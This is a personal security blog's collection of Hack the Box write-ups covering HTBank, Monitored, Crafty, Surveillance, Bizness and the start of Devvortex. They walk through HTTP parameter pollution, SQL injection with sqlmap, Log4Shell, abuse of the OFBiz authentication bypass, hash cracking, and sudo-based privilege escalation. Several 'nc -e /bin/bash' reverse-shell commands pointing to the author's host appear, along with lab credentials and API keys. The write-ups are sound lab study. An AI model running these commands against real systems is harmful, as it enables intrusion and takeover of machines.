[{"content":"Welcome! #I\u0026rsquo;m starting this blog, mainly for myself, to collect the numerous writeups I have written, to motivate myself to write more and to document my interests and the topics I\u0026rsquo;m researching.\nThe second purpose is to share some of the knowledge in case it might be of use to someone. Here you will find writeups of my bug bounty adventures, the training machines I have solved on platforms like Hack the box (and others) and in-depth guides or research articles about the topics of security, programming or usually both.\nAll the articles written here are my own. There will be no AI generated content or AI slop as the name better implies on this site.\nI hope you will enjoy and if you want to discuss any of the topics you can send me an email.\n","date":"30 December 2025","permalink":"https://cruxqsec.github.io/about/","section":"cruxqsec","summary":"","title":""},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/","section":"cruxqsec","summary":"","title":"cruxqsec"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/writeups/","section":"","summary":"","title":""},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/htb/","section":"tags","summary":"","title":"htb"},{"content":"HTB easy web challenge - HTBank #Let\u0026rsquo;s look at this supposedly easy challenge from Hack the Box.\nWebsite #So first we\u0026rsquo;ll manually explore the website. Let\u0026rsquo;s jump in.\nWe\u0026rsquo;re first greeted with a login page.\nIf we register a user and login we land on the /home page. It looks like this.\nSo this is a bank app and we have a wallet address which is a hex number and the wallet has a balance. If we try to withdraw the money we get and error. The add money button doesn\u0026rsquo;t work and there is no Javascript function to trigger it like the withdraw one. If we look we find this interesting piece of Javascript in the home.js file.\nvar xhr = new XMLHttpRequest(); xhr.open(\u0026#39;GET\u0026#39;, \u0026#34;https://api.etherscan.io/api?module=account\u0026amp;action=balance\u0026amp;address=0x5A0b54D5dc17e0AadC383d2db43B0a0D3E029c4c\u0026amp;tag=latest\u0026amp;apikey=FH12Z2IYGM3JKD1RN42NG6VHSXV73YX61H\u0026#34;, true); xhr.send(); xhr.onreadystatechange = processRequest; function processRequest(e) { var response = JSON.parse(xhr.responseText); var bal = (response.result / Math.pow(10, response.result.length)); $(\u0026#39;.bal\u0026#39;).text(bal.toFixed(4)); } It looks like it\u0026rsquo;s sending a GET request to an API of a cryptocurrency wallet address if I take a wild guess but we see the JQuery part $('.bal').text(bal.toFixed(4)); that then adds it to a HTML element (probably a div).\nSo my instinct tells me this is just a decoy, I doubt that our account balance is based on client side code. The balance is usually stored somewhere safe in a database for example. So let\u0026rsquo;s look at the code and learn more about how the site works.\nCode analysis #When we open the challenge we see we have two directories /flask_frontend and /php_backend. So we\u0026rsquo;re dealing with two different technologies - PHP and Python. What we just viewed is probably the frontend so let\u0026rsquo;s take a look at that first.\nFrontend part #We know it\u0026rsquo;s a Flask app and from the imports we can see it\u0026rsquo;s using MySQL. Let\u0026rsquo;s get a feel of the land first and check the routes.\n/register - simple function, we first check if the user exists, if no then we add him to the database\n/login - simple login function, we set a session cookie and in the login_user_db function we generate a JWT token.\n/home - this is the first interesting function, we get the user from the database, and also we get the flag if the show_flag condition is met. So it looks like the flag is in the database.\n@web.route(\u0026#39;/home\u0026#39;) @isAuthenticated def home(decoded_token): user = getUser(decoded_token.get(\u0026#39;username\u0026#39;)) flag = getFlag() if(flag[0].get(\u0026#39;show_flag\u0026#39;) == 1): return render_template(\u0026#39;home.html\u0026#39;, user=user[0], flag=flag[0].get(\u0026#39;flag\u0026#39;)) return render_template(\u0026#39;home.html\u0026#39;, user=user[0]) We can confirm this by checking the entrypoint.sh script which generates the database when the container starts.\nSo there is this show flag functionality which is at first turned off, if we manage to turn it on somehow we can view the flag. We also have the users table present here which confirms our previous assumption that the balance is stored in a database.\nSo let\u0026rsquo;s explore more.\n/api/withdraw - this route is probably the most interesting\n@api.route(\u0026#39;/withdraw\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) @isAuthenticated def withdraw(decoded_token): body = request.get_data() amount = request.form.get(\u0026#39;amount\u0026#39;, \u0026#39;\u0026#39;) account = request.form.get(\u0026#39;account\u0026#39;, \u0026#39;\u0026#39;) if not amount or not account: return response(\u0026#39;All fields are required!\u0026#39;), 401 user = getUser(decoded_token.get(\u0026#39;username\u0026#39;)) try: if (int(user[0].get(\u0026#39;balance\u0026#39;)) \u0026lt; int(amount) or int(amount) \u0026lt; 0 ): return response(\u0026#39;Not enough credits!\u0026#39;), 400 res = requests.post(f\u0026#34;http://{current_app.config.get(\u0026#39;PHP_HOST\u0026#39;)}/api/withdraw\u0026#34;, headers={\u0026#34;content-type\u0026#34;: request.headers.get(\u0026#34;content-type\u0026#34;)}, data=body) jsonRes = res.json() return response(jsonRes[\u0026#39;message\u0026#39;]) except: return response(\u0026#39;Only accept number!\u0026#39;), 500 We see that we send a POST request to this route with the account data and amount we want to withdraw, then it checks the users balance (if he has enough money) and if the value is not negative, then it sends another POST request to the PHP backend we saw earlier, also to an API endpoint /api/withdraw.\nSo my first thought is SQL injection because the flag is in the database. So I check the database.py to look if anything looks odd. We have this query() function\ndef query(query, args=(), one=False): cursor = mysql.connection.cursor() cursor.execute(query, args) rv = [dict((cursor.description[idx][0], value) for idx, value in enumerate(row)) for row in cursor.fetchall()] return (rv[0] if rv else None) if one else rv and it gets called like this :\nuser = query(\u0026#39;SELECT username FROM users WHERE username = %s AND password = %s\u0026#39;, (username, password,), one=True) It looks a bit weird, we\u0026rsquo;re doing some sort of string formatting and this could be potentially vulnerable although I don\u0026rsquo;t have much experience in Flask and can\u0026rsquo;t tell if this is right away. So after reading some documentation and playing with this for a bit trying some injections I gave up as this is probably not injectable as there is some sort of sanitization built-in inside this function.\nutils.py has some utility functions like JWT token generation, verification and decoding.\nconfig.py has the database configuration and the PHP backend server info.\nPHP Backend #So here we have the backend part. At first glance we se we\u0026rsquo;re using the MVC pattern. This backend is much simpler. We have a single route which is the one we saw earlier /api/withdraw which calls this WithdrawController index function. Let\u0026rsquo;s see what it does.\nclass WithdrawController extends Controller { public function __construct() { parent::__construct(); } public function index($router) { $amount = $_POST[\u0026#39;amount\u0026#39;]; $account = $_POST[\u0026#39;account\u0026#39;]; if ($amount == 1337) { $this-\u0026gt;database-\u0026gt;query(\u0026#39;UPDATE flag set show_flag=1\u0026#39;); return $router-\u0026gt;jsonify([ \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;OK\u0026#39; ]); } return $router-\u0026gt;jsonify([ \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;We don\\\u0026#39;t accept that amount\u0026#39; ]); } } We get the parameters we send with POST, we check if the ammount to withdraw is equal to 1337, if it is we set show_flag option to true.\nThe first thing that comes to my eyes is this part\nif ($amount == 1337) PHP is known for it\u0026rsquo;s type juggling vulnerabilities and here we have a loose comparison ==, so maybe we could abuse this, but as we know from earlier, we also have a couple of checks in the frontend part, to see if the account has enough money to withdraw it. So after playing with this for a bit trying to bypass these checks (the frontend ones are problematic as there is where we check the balance) I gave up as I it didn\u0026rsquo;t yield any results and I couldn\u0026rsquo;t find anything online. So what now?\nSolution - HTTP Parameter Pollution #So what if we could somehow trick the frontend server to read a different amount value than the backend server? Here comes parameter pollution to save the day. After reading about it for a while we can see that different servers behave differently about which value to choose if for example we would submit two amount values.\nPHP with Apache/Nginx for example takes the last value, while Flask takes the first one. Bingo!\nSo I intercepted the request with Burp and copied the boundary and the data.\nWe can see we get a OK message which means the request was successful and the backend server updated the flag option. We can now read it from the /home page. Pwned!\n","date":"21 June 2024","permalink":"https://cruxqsec.github.io/writeups/htb-htbank/","section":"","summary":"Easy difficulty web challenge from Hack the box","title":"HTB HTBank"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/php/","section":"tags","summary":"","title":"PHP"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/","section":"tags","summary":"","title":"tags"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/web-challenge/","section":"tags","summary":"","title":"web-challenge"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/cve/","section":"tags","summary":"","title":"cve"},{"content":"Enumeration #I started out with a classic nmap scan:\nmkdir nmap sudo nmap -sC -sV 10.10.11.248 -oA nmap/monitored We can see nothing special, we have SSH, web server and LDAP running.\nLDAP #Let\u0026rsquo;s start with this. To enumerate the LDAP port we can use nmap :\nnmap -n -p 389 -sV --script \u0026#34;ldap* and not brute\u0026#34; 10.10.11.248 I played with ldapsearch but found nothing.\nWebsite #I checked out the site and was redirected to nagios.monitored.htb.\nSo just add it to /etc/hosts and it works. I saw it\u0026rsquo;s using NagiosXI. I couldn\u0026rsquo;t find the version but it looked recent. I searched for any recent public vulnerabilities and found nothing that could be used as we are still unauthenticated. I ran some more enumeration while looking around:\ngobuster dir -u https://monitored.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k gobuster finds the /nagios endpoint which is prompting for HTTP Authentication. So I searched for some default credentials and found a few:\nroot:nagiosxi can be used for the database and ssh.\nnagiosadmin:nagiosadmin is also used as a default for Nagios.\nSo the next logical steps is to try these on /nagios endpoint with hydra :\nhydra -L users.txt -P passwords.txt nagios.monitored.htb https-get \u0026#34;/nagios\u0026#34; The users were created from default users plus admin and a few others standard ones. I used the most common 1000 passwords for the password word list plus the default credentials. I didn\u0026rsquo;t get a match. No easy wins unfortunately. Oh well\u0026hellip;\nThen I tried the /nagiosxi directory and to my surprise it exists.\nSo I just continued with the gobuster searches using different website endpoint directories and different word lists.\nSo after scanning https://nagios.monitored.htb/nagiosxi/ endpoint for directories we can see some directories require that we are authenticated\nBut there is this this interesting directory /terminal. After visiting it we see it\u0026rsquo;s running ShellInABox.\nIts version is 2.20. I searched for any known vulnerabilities and found none. I was a bit stuck so I backtracked a bit and tried a few other things.\nMore enumeration #It did a nmap UPD scan with\nsudo nmap -sU 10.10.11.248 While that was running I searched for a way to discover the NagiosXI version and also tried some hand fuzzing of and HTTP GET parameters and such. When the scan returned I found something interesting.\nFor the open|filtered ports nmap can\u0026rsquo;t detect wether they are open or close.\nWe have NTP on port 123 which can\u0026rsquo;t really be used.\nWe have SNMP which could lead to something interesting.\nSNMP #So I ran\nsudo nmap -sU -sC -sV -p 161 10.10.11.248 Note: We have to use sudo because doing UDP scans required admin rights. to enumerate it even further. We get the following:\nHere we have a bun of processes and some basic info.\nHere we can see the services listening and the open ports. So I proceed to scan the port 162 with the same nmap parameters:\nsudo nmap -sU -sV -sC -p 162 10.10.11.248 Nothing interesting here. So after that I proceeded to try to brute force the community string as we can see from the above output of the first nmap scan that SNMPv3 Server is being used. I used hydra :\nhydra -P /opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt monitored.htb snmp I found the default one being used immediately.\nAfter that I ran snmpwalk and snmpbulkwalk (they produce similar results) to enumerate the MIB:\nsnmpwalk -v2c -c public 10.10.11.248 \u0026gt; snmpwalk-result snmpbulkwalk -c public -v2c 10.10.11.248 . \u0026gt; snmpbulkwalk-result After searching through it I found that it leaks processes. In the processes I found something that could probably be credentials: svc:XjH7VCehowpR1xZB\nI also found some userIds being used by LDAP and snmpd but they were standard.\nI tried the credentials on all the NagiosXI login page, on the ShellInABox terminal, on SSH and finally got a hit on the /nagios endpoint with HTTP basic authentication.\nEntering Nagios #Nagios is a event monitoring system providing alerts for services, servers, applications, etc.\nFirst I checked to see what version is running and I found Version 4.4.13 in Nagios XI. I didn\u0026rsquo;t find anything useful related to this version. I also didn\u0026rsquo;t find anything useful on the Nagios Core website. Maybe some possible usernames which I couldn\u0026rsquo;t determine if they were created by other players or the site.\nSo I decided to backtrack and review if I missed anything. As I couldn\u0026rsquo;t authenticate to any other part of the website I searched for a way to use the credentials. I went back to my new gobuster scans which I ran and found the /api endpoint.\nI found this v1 endpoint. I enumerated it even further. This time I had to exclude all the results by length as they were all returning 200 success response, they were also saying that no API key is provided so we might need that to use this API.\nI added --exclude-length=32 and found this.\nAfter visiting this endpoint I found this.\nIt seems we have to send a POST request to authenticate.\nSo we can use a username and password to authenticate. I tried the earlier credentials and got this in the response:\nWe can see we have an auth_token, after I searched how I could use this token, I found the documentation here. We can see we just have to add ?token=token-value to use it.\nI tried it on /nagiosxi/index.php and we\u0026rsquo;re in.\nOn the bottom left I highlighted the Nagios XI version which is 5.11.0. After a quick search we can see there a couple of vulnerabilities for this version as described here. The SQLi were the most interesting so I tried to exploit those. But we can\u0026rsquo;t access the /admin endpoint as we\u0026rsquo;re not authorized to do so.\nOr so I thought. How happy I was when proven wrong. I tried to visit the /nagiosxi/admin/banner_message-ajaxhelper.php endpoint which is the one abused in the CVE-2023-40931.\nI got a 200 success response code and no error message saying I needed to be authenticated.\nExploiting CVE-2023-40931 #So I decided to put sqlmap up to the task of exploiting this CVE. So let\u0026rsquo;s craft the command.\nsqlmap -u \u0026#34;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php\u0026#34; --data=\u0026#34;action=acknowledge_banner_message\u0026amp;id=3\u0026#34; --cookie=\u0026#34;nagiosxi=72jvrn22p6lo6n1e5e88tdsm44\u0026#34; -p id So as we can see we have to specify the data that\u0026rsquo;s being sent, which is mentioned in the site where I found the description of the CVE, we also have to use the cookie that we got from the authentication to index.php with the token value.\nAfter that I we find that id is indeed injectable.\nSo we can append -D nagiosxi -T xi_users --dump to the above sqlmap command.\n(I figured the database name would be nagiosxi and the table we get from the CVE description, we could also install Nagios XI to find what are is the default name for the database).\nWe get this:\nHere we have the admin password hash and the API key. I tried cracking the hash with\nhashcat but I couldn\u0026rsquo;t. The API key on the other hand could be useful.\nExploiting the API #So after checking the documentation I found we can navigate to\nHelp \u0026gt; API Docs \u0026gt; Introduction in the NagiosXI page. There we can see how to use the API key. Then I went and downloaded the NagiosXI and use this documentation to install it locally and searched for the System reference under the same Help \u0026gt; API Docs which was unavailable to me on the nagios.monitored.htb host because I\u0026rsquo;m not admin.\nHere we see how we can add a new user. So I added it:\ncurl -XPOST \u0026#34;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL\u0026#34; -d \u0026#34;username=azb\u0026amp;password=azbestus\u0026amp;name=Azbest\u0026amp;email=azb@monitored.htb\u0026amp;auth_level=admin\u0026#34; -k So now we\u0026rsquo;re logged in as admin. Finally!\nI searched around the website for some time also reading some documentation and forums about how I could run commands which I saw was possible from the NagiosCore I found earlier and from the API docs. So I found the ability to add commands under Configure \u0026gt; Advanced Configuration \u0026gt; Core Config Manager \u0026gt; Commands.\nSo here I added a new command that spawned a reverse shell with\nnc -e /bin/bash my-ip my port I first tried with a bash reverse shell but it didn\u0026rsquo;t work\u0026hellip;\nThen I went under Monitoring \u0026gt; Services (under the same Core Config Manager) and found services that can run commands.\nSo then I ran the command and got a reverse shell. After all this pain and RTFM moments we are finally on the box.\nPrivilege escalation #So like always I first uploaded linpeas.sh and ran it. Then I checked sudo -l to find if we can use sudo anywhere. We find we can:\nWe see we can run quite a few things. We can restart services and do all kinds of stuff. So I proceeded to check out the linpeas output. I found this which was very interesting:\nAs we can see we can write to the /usr/local/nagios/bin/ files which could be then restarted by the above commands that don\u0026rsquo;t require sudo password.\nI tried it with npcd. I deleted the binary and added a simple reverse shell script:\nAfter that I made it an executable with chmod (very important, I forgot this at first and didn\u0026rsquo;t get the reverse shell!!!).\nThen I tried to restart the service with sudo /etc/init.d/npcd restart. But this command doesn\u0026rsquo;t exist!?\nWhat now?\nI was stuck here a bit as this was very weird. Also I couldn\u0026rsquo;t write to /etc/init.d so I couldn\u0026rsquo;t create a new npcd service file\u0026hellip;\nBut if we look at the sudo -l output again we can see we have this command that we can run:\n(root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh * # so then we just run it, I know brilliant sudo /usr/local/nagiosxi/scripts/manage_services.sh * This shows use we can restart npcd!\nBingo! I just restarted it and got the reverse shell. Pwned!\n","date":"14 May 2024","permalink":"https://cruxqsec.github.io/writeups/htb-monitored/","section":"","summary":"Medium difficulty Linux machine from Hack the box","title":"HTB Monitored"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/linux/","section":"tags","summary":"","title":"linux"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/snmp/","section":"tags","summary":"","title":"snmp"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/sql-injection/","section":"tags","summary":"","title":"sql-injection"},{"content":"Enumeration #Just a classic nmap scan to start:\nWe add crafty.htb to /etc/hosts and visit the website.\nThe website is blank. ffuf doesn\u0026rsquo;t find any other files than the ones that are linked on the site. It\u0026rsquo;s a dead end. We can also use shortscan but we don\u0026rsquo;t find anything useful either.\nWe can also enumerate subdomains with ffuf :\nffuf -w subdomains.txt -u http://10.10.11.249 -H \u0026#34;HOST: FUZZ.crafty.htb\u0026#34; We find play.crafty.htb but it just redirects to the main one.\nSo not much to go on. But we haven\u0026rsquo;t enumerated everything. Let\u0026rsquo;s go for 2 more ports scans.\n# first an all ports scan sudo nmap -p- crafty.htb -T3 # then a UDP scan sudo nmap -sU crafty.htb -T3 Full port scan shows minecraft is open which is probably a Minecraft server.\nLog4Shell #After enumerating with nmap we get the running version 1.16.5 which is vulnerable to Log4Shell. This was one of the most serious vulnerabilities affecting many programs using Log4J Java logging library\nWe download the POC and set it up as is described. Then we can download a\nMinecraft launcher or this python library to establish a connection to the server. I just connected to the server and just posted the payload into the chat. After a while we get reverse shell.\nPrivilege escalation #I upgraded my reverse shell to a meterpreter shell with mfvenom and mfconsole. After exploring a bit we find that there is not much to go on.\nThere is a C:\\Users\\svc_minecraft\\Server\\plugins directory with a JAR file.\nMaybe there could be something useful inside. Let\u0026rsquo;s try to decompile it. After decompiling it in an online decompiler we get a potential password. Pretty random.\nThe password s67u84zKq8IXw is available but we can\u0026rsquo;t login as easily as the reverse shell is non interactive and we are prompted for password.\nSo I downloaded RunasCs from the releases and uploaded it via mfconsole. Then on the box I ran:\nPS C:\\programdata\u0026gt; .\\RunasCs.exe Administrator s67u84zKq8IXw \u0026#34;cmd /c whoami\u0026#34; crafty\\administrator We get root. Pwned!\n","date":"4 April 2024","permalink":"https://cruxqsec.github.io/writeups/htb-crafty/","section":"","summary":"Easy difficulty Windows machine from Hack the box","title":"HTB Crafty"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/log4j/","section":"tags","summary":"","title":"log4j"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/rce/","section":"tags","summary":"","title":"rce"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/windows/","section":"tags","summary":"","title":"windows"},{"content":"Enumeration #I started with an nmap scan:\nsudo nmap -sC -sV 10.10.11.245 -oA nmap/surveillance Nothing special was found, so I proceeded with a full port scan while checking out the website:\nsudo nmap -p- -T3 -oA nmap/surveillance-full 10.10.11.245 Website #The website is about surveillance equipment. I found 2 possible usernames:\nAlan Chapman\nKimberly Brentford\nThese could be useful later.\nIn the background I ran feroxbuster for enumeration while we explore : (only 10 threads so we don\u0026rsquo;t crash or slow down the site)\nferoxbuster -u http://surveillance.htb/ -t 10 At the bottom of the index page there is a Powered by Craft CMS.\nIt looks like it\u0026rsquo;s using Craft as CMS . It is written in PHP and Javascript and it\u0026rsquo;s variants. The version the link points to appears to be 4.4.14. There appears to be a public vulnerability for this version that enables RCE.\nThe full port scan I ran earlier showed no more ports are open.\nI also ran gobuster to check for any virtual hosts:\ngobuster vhost -u http://surveillance.htb/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt None were found so I ran another gobuster to find files:\ngobuster dir -u http://surveillance.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt It found a index.php file which confirms this site is using PHP and a weird web.config which has some rewrite rules.\nFoothold with RCE in Craft CMS #So as I mentioned earlier there is a remote code execution vulnerability present in this version. I read trough the vulnerability and it\u0026rsquo;s quite an interesting was of exploiting. It is all nicely explained in this article but in essence we can create arbitrary objects with which we can include some code (there is also a nice ImageMagic trick), after that we upload our reverse shell file and we can execute arbitrary commands. I found a working POC here. It worked very nicely and allowed us a simple non interactive shell. I upgraded it with a simple:\necho \u0026#39;base64encoded reverse shell\u0026#39; | base64 -d | bash and set up a listener to get the callback:\nnc -lvnp 4444 Privilege escalation #Now we\u0026rsquo;re on the box. We have to get to the user. So I looked around and found a surveillance--2023-10-17-202801--v4.4.14.sql.zip file inside\n/var/www/html/craft/storage/backups. I downloaded it, unzipped it and inside was the database scheme and this interesting part:\nAfter the email we have the hash and with some quick trying out we can figure out it\u0026rsquo;s a SHA-256 hash (I used CyberChef and hash-identifier tools).\nI tried cracking it with:\nhashcat -m 1400 hash /usr/share/wordlists/rockyou.txt and we get a match!\nEarlier I also checked which users we have and found 3 with\ncat /etc/passwd | grep bash There is root of course and then matthew and zoneminder. I tried SSHing with the cracked cracked credentials and got a match with matthew!\nGetting root #I started with uploading linpeas.sh as always and ran a scan too see what we have on the server. When I got down to the listening ports section I found something listening on port 8080. So I used nc to try to connect and found it\u0026rsquo;s a web server.\nThen I used curl to send the request: curl http://localhost:8080 and when I got the response it looked different than the initial website we exploited.\nSo I used ssh to port forward so I can access this web application on my local browser like this:\nssh -L 8088:surveillance.htb:8080 matthew@surveillance.htb After that I visited the site and found there is a ZoneMinder login page. After a quick google search I found out this is the surveillance software being used to monitor cameras and such. I tried to login with the user matthew and the zoneminder user we discovered earlier and the credentials we cracked. It didn\u0026rsquo;t work. After that I tried the admin user and it worked. We\u0026rsquo;re in!\nZoneMinder website #At the top right we can see the version it\u0026rsquo;s being used. It\u0026rsquo;s the v1.36.32 version. Again I did a quick google search and found there is a RCE vulnerability available. I found a description of this vulnerability here and POC here.\nSo I downloaded it and run it with\npython3 exploit.py -t http://localhost:8088/ -ip 10.10.16.34 -p 3001 and set up a nc listener. It worked and got a reverse shell. Again I did the same process with downloading linpeas.sh to the target and exfiltrating the output.\nThen I tried sudo -l and found that we can execute ZoneMinder Perl scripts.\nAs we can see, we can execute all the Perl scripts provided by ZoneMinder.\nAfter playing with the for a little I figured out a was for a simple Bash command substitution inside one of the parameters of the scripts. I tried a few and finally one of them worked, it was zmupdate.pl, like this:\nsudo zmupdate.pl --user=\u0026#39;$(bash /dev/shm/rev-shell.sh)\u0026#39; -pass=test I set up the listener and executed the reverse shell and boom, we get root.\nPwned!\n","date":"28 March 2024","permalink":"https://cruxqsec.github.io/writeups/htb-surveillance/","section":"","summary":"Medium difficulty Linux machine from Hack the box","title":"HTB Surveillance"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/sudo-abuse/","section":"tags","summary":"","title":"sudo-abuse"},{"content":"Enumeration #We start with a classic nmap scan:\nmkdir nmap sudo nmap -sC -sV 10.10.11.252 -oA nmap/bizness We have 3 ports open. The common 80 HTTP port redirects to a SSL encrypted HTTPS port 443. The port 22 has an outdated version of OpenSSH running but no publicly known vulnerabilities that jump out.\nWebsite #If we visit the IP of the host we get redirected to https://bizness.htb/. We add that domain to our /etc/hosts and visit the site again. We find a simple site built with standard technologies. Whatweb doesn\u0026rsquo;t show if this is a PHP or NodeJS or maybe a Python site. I then proceeded to enumerate the directories so I ran\nferoxbuster but because of it\u0026rsquo;s speed the site kept crashing so I just ended up using gobuster:\ngobuster dir -u https://bizness.htb/ -k -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -b 302 The -b 302 flag is there because if we just try to visit a random endpoint we get redirected to the main page, so we have to filter by redirects not by 404 HTTP responses. But even with this we get a few false positives.\nThis is the result. We only have one directory present and that is /control. Others are false positives. If we visit this website we find this.\nSo we see the site is using Apache OFBiz framework. From the Github description we see that this is:\nOFBiz is an Enterprise Resource Planning (ERP) System written in Java and houses a large set of libraries, entities, services and features to run all aspects of your business.\nThe site is giving us this error message: org.apache.ofbiz.webapp.control.RequestHandlerException: Unknown request [null]; this request does not exist or cannot be called directly..\nSearching this error we find that there is a Authentication Bypass CVE that is currently being exploited.\nI also decided to run a new feroxbuster scan and just reduce the number of threads to slow down the execution.\nferoxbuster -u https://bizness.htb/ -t 10 I find that feroxbuster is much more effective at finding correct results as gobuster didn\u0026rsquo;t find the /catalog endpoint which points us to the login page at https://bizness.htb/catalog/control/main.\nAt the bottom right we can see the Apache OFBiz version which is 18.12. This version is vulnerable to the Authentication Bypass I mentioned earlier. The complete explanation of this bypass can be found here.\nAuthentication Bypass #If we read the CVE we find out that we can bypass the authentication control and use website tools provided with Apache OFBiz. To try out this exploit we can visit the:\nhttps://bizness.htb/webtools/control/ping?USERNAME=\u0026amp;PASSWORD=\u0026amp;requirePasswordChange=Y as is described in the CVE. If we get result PONG printed this means this is exploitable. And we can see this site is vulnerable.\nSo how to proceed with this exploit? What else can we do beside pinging?\nFirst I searched for some clues and found this demo app of Apache OFBiz. The default credentials are provided and we can play with it. If there was no other way we could download our own version and set it up. In here I found this part of the website:\nIt looks like we can execute Groovy code. So I intercepted this request when we hit run to see how it is formed.\nSo it looks like we just have to send a POST request to /webtools/control/ProgramExport add ?USERNAME=\u0026amp;PASSWORD=\u0026amp;requirePasswordChange=Y to use the authentication bypass that we talked about earlier and use a reverse shell or some command inside the data sent.\nSo after playing with this for a little bit, trying to get it to work I gave up as this just didn\u0026rsquo;t execute and all I was getting was an error message. But after reading the report I linked earlier I found there is another interesting endpoint:\n/webtools/control/xmlrpc?USERNAME=\u0026amp;PASSWORD=\u0026amp;requirePasswordChange=Y\nThere is another vulnerability that was discovered by researchers after the authentication bypass which includes this endpoint. This vulnerability is more complex so I just ended up searching for a public proof of concept and found this.\nWe just run:\npython3 exploit.py --url https://bizness.htb to see if the host is vulnerable which we checked by hand earlier. Then we can simply run commands with the --cmd flag. So I ran a reverse shell:\nnc -e /bin/bash 10.10.15.0 3001 to get a reverse shell. I had quite a few problems because the server was unstable.\nGetting a foothold and escalating privileges #So first I tried to get a stable shell with:\npython3 -c \u0026#39;impoty pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; # control z to background stty raw -echo # on our system trick and had a few problems because my shell kept crashing. When I finally got a stable shell I decided to upload my public key and add it to\n~/.ssh/authorized_keys so I can just SSH in.\nThen I started exploring.\nThe application directory from where it was installed is in /opt/ofbiz.\nI found a couple passwords. First in the /opt/ofbiz/docker/examples/postgres-demo directory. I found a postgres.env file which had this password\nPOSTGRES_PASSWORD=\u0026quot;20wganpfDASBtBXY7GQ6\nIt lead to nowhere\u0026hellip;\nThen I found an ofbiz-postgres.env file which had these passwords:\nOFBIZ_POSTGRES_OFBIZ_DB=ofbizmaindb OFBIZ_POSTGRES_OFBIZ_USER=ofbiz OFBIZ_POSTGRES_OFBIZ_PASSWORD=\u0026#34;Ab6SqDD2YM2lmEsvao-\u0026#34; OFBIZ_POSTGRES_OLAP_DB=ofbizolapdb OFBIZ_POSTGRES_OLAP_USER=ofbizolap OFBIZ_POSTGRES_OLAP_PASSWORD=\u0026#34;P7TFUtQHSuvha8gSxMME\u0026#34; OFBIZ_POSTGRES_TENANT_DB=ofbiztenantdb OFBIZ_POSTGRES_TENANT_USER=ofbiztenant OFBIZ_POSTGRES_TENANT_PASSWORD=\u0026#34;4oXET73QGriblUejjbvR\u0026#34; These also lead to nowhere and are probably just examples as discerned from the directory structure.\nIn the /opt/ofbiz/runtime/data we find that a Apache Derby database is probably being used. So I just download the whole data directory with:\ntar -cvf data.tar data/ gzip data.tar and then gzip. Then I run a Python HTTP server and download it with wget.\nOn my local machine I had to install the derby toolkit with\napt install derby-tools which is the package I found in the repositories. First I played with the server a bit, starting it with:\nderbyctl start -h localhost -p 3333 And tried connecting to it with the ij tool. But then I figured out I can just connect to the database with ij by doing:\nconnect \u0026#34;jdbc:derby:/path/to/database/file\u0026#34;; in our case that is the data directory we downloaded and the three databases which are included are inside /data/derby and are called ofbiz, ofbizolap and ofbiztenant.\nI first connected to the ofbiz (we can use MYSQL syntax when querying the database). I searched for the all the tables and found a couple. Of interest were SYS.SYSUSERS and tables OFBIZ.USER_LOGIN, OFBIZ.USER_LOGIN_HISTORY, etc.\nIn the OFBIZ.USER_LOGIN I found this hash:\nCracking the root hash #It was in a weird format and I was struggling quite a bit. I searched inside the target /opt/ofbiz/framework/security/config/security.properties and found these settings:\nSo it\u0026rsquo;s probably using SHA1 even tho the bottom setting confused me. So I searched the documentation to find the code that builds the hash. From the bottom picture of the code we can see the hash is built like this:\n$SHA$ - denotes the hash type\nd$ - this is the salt\nuP0_QaVBpDWFeo8-dRzDqRwXQ2I - this is a Base64 encoded URL Safe string. (second picture)\nThen I found the documentation for Base64.encodeBase64URLSafeString.\nWe can see that this URL safe variant emits - and _ instead of + and / characters. So I used CyberChef to decode it and then convert it to hex. I converted it to hex because we can then simply use hashcat and crack it as a normal SHA1 hash.\nSo then I used used this decoded hash and put it in the right format as per hashcat examples for SHA1.\nhash:salt is the format so the end result is b8fd3f41a541a435857a8f3e751cc3a91c174362:d.\nThen I ran hashcat:\nhashcat -m 120 hash-converted /usr/share/wordlists/rockyou.txt We have a match!\nI ended up using the authentication bypass to get another shell and tried it with su and we get root. Pwned!\n","date":"11 March 2024","permalink":"https://cruxqsec.github.io/writeups/htb-bizness/","section":"","summary":"Easy difficulty Linux machine from Hack the box","title":"HTB Bizness"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/password-cracking/","section":"tags","summary":"","title":"password-cracking"},{"content":"Enumeration #First an nmap scan:\nsudo nmap -sC -sV devvortex.htb -oA nmap/devvortex.htb First I ran it with the IP address but then I always run it with the domain name also because nmap uses different scripts Next I used feroxbuster with wordlists for directories and files and found nothing. Then I used gobuster to enumerate virtual hosts and found something:\ngobuster vhost -u http://devvortex.htb/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt Website #So next I added it to /etc/hosts and accessed it.\nWhen running feroxbuster and gobuster on dev.devvortex.htb we run upon some errors. First we have to append the / to the end of the search result to find a directory. If we look for one that doesn\u0026rsquo;t exist we get a custom 404 site where there is a link to the home site like this: 